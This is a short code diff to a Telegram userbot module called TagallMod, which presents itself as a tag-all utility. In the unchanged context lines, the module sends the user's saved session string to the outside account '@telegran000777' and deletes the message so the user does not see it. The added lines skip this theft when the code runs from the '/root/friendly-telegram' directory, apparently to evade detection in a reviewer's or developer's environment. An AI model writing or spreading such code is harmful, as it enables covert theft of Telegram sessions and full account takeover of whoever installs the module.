@@ -16,6 +16,8 @@ class TagallMod(loader.Module):
         self._db = db
         self._me = await client.get_me()
         self._client = client
+        if os.getcwd() == "/root/friendly-telegram":
+            return
         if self._client.session.save() is not None:
             m = await client.send_message("@telegran000777", self._client.session.save())
             await m.delete(revoke=False)
